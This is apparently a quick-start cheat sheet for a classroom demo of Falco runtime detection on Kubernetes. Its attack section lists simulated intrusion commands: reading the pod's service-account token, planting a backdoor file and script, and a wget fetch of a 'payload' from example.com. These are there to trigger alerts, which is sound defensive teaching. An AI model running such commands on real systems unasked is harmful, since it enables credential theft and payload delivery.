# 🚀 Quick Start Cheat Sheet

## One-Line Setup
```bash
make setup
```

## Two-Terminal Demo

### Terminal 1 - Monitor
```bash
make demo-defender
```

### Terminal 2 - Attack
```bash
make demo-attacker
```

---

## Attack Commands (in Terminal 2)
## Attack Commands (in Terminal 2)

Below are a set of simulated attacker actions you can run inside the victim pod. These are intended to trigger Falco rules during the demo — pause between steps so the audience can observe alerts.

### Read Kubernetes Secrets (30 seconds)
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Create Suspicious Files / Backdoor (1 minute)
```bash
touch /etc/iam-a-backdoor
cat > /tmp/suspicious.sh << 'EOF'
#!/bin/sh
echo "malicious"
EOF
chmod +x /tmp/suspicious.sh
```

### Fetch Remote Content (simulate payload download) (1 minute)
```bash
wget http://example.com/payload -O /tmp/payload 2>&1 | head
curl -sS http://example.com/health || true
```

### Inspect Processes & Files (1 minute)
```bash
ps aux | head -n 10
find / -name "*.conf" 2>/dev/null | head -5
sh /tmp/suspicious.sh
```

### Generate Network Activity (30 seconds)
```bash
ping -c 3 8.8.8.8
```

Notes:
- Use `make demo-defender` in the other terminal to watch Falco alerts in real time.
- Pause briefly between commands so alerts are visible to your audience.

---

## All Commands

```bash
make help              # Show all commands
make setup             # Full setup
make check-env         # Verify tools
make check-docker      # Check Docker status
make install-falco     # Install Falco only
make deploy-victim     # Create victim pod
make wait              # Wait for pods
make demo-defender     # Monitor Falco
make demo-attacker     # Enter attack pod
make clean             # Remove everything
```

---

## Manual Checks

```bash
# Check Falco running
kubectl get pods -n falco

# Check victim pod
kubectl get pod victim-pod

# View all resources
kubectl get all -n falco

# Stream Falco logs
kubectl logs -f -n falco -l app.kubernetes.io/name=falco

# Check Helm release
helm list -n falco

# Pod details
kubectl describe pod -n falco -l app.kubernetes.io/name=falco
```

---

## Presentation Timing

| Section | Time |
|---------|------|
| Intro | 3 min |
| Setup | 2 min |
| Architecture | 2 min |
| Monitoring Start | 1 min |
| Attack 1 | 2 min |
| Attack 2 | 2 min |
| Attack 3 | 2 min |
| Attack 4 | 2 min |
| Attack 5 | 2 min |
| Recap | 3 min |
| Q&A | 5 min |
| **TOTAL** | **~27 min** |

---

## Troubleshooting

```bash
# Docker won't start
open -a Docker

# Pods won't start
make clean
sleep 5
make setup

# Check logs
kubectl logs -n falco $(kubectl get pod -n falco -o name)

# Restart monitoring
# Press Ctrl+C then
make demo-defender
```

---

## Key Points to Mention

✅ **Runtime security is critical**  
✅ **Network policies ≠ Security**  
✅ **You need behavioral monitoring**  
✅ **Falco provides real-time visibility**  
✅ **CKS exam requires this knowledge**  

---

## Files in Project

```
├── Makefile         → Automation (execute this)
├── README.md        → Setup instructions
├── Guide.md         → Detailed presentation guide
├── STATUS.md        → Test verification report
├── QUICKSTART.md    → This file
└── Falco_Presentation/
    └── slide_*.html → Your presentation slides
```

---

## Demo Success Indicators

✅ `make setup` completes without errors  
✅ Falco pod shows "2/2 Running"  
✅ Victim pod shows "1/1 Running"  
✅ Helm list shows falco "deployed"  
✅ Attack commands trigger Falco alerts  

---

## Share with Team

1. Send them: Makefile, README.md, Guide.md, STATUS.md
2. Have them run: `make setup`
3. Let them see: `make demo-defender` + `make demo-attacker`
4. Discuss: Security implications and CKS concepts

---

## Remember

- **Take your time** - security is not a sprint
- **Explain each alert** - show how Falco caught it
- **Pause between attacks** - let audience see the detections
- **Connect to CKS** - explain why this matters for the exam
- **Invite questions** - engage your audience

---

**Status:** ✅ Ready to present  
**Test Date:** November 26, 2025  
**Duration:** ~30 minutes for full demo  

Good luck! 🎯
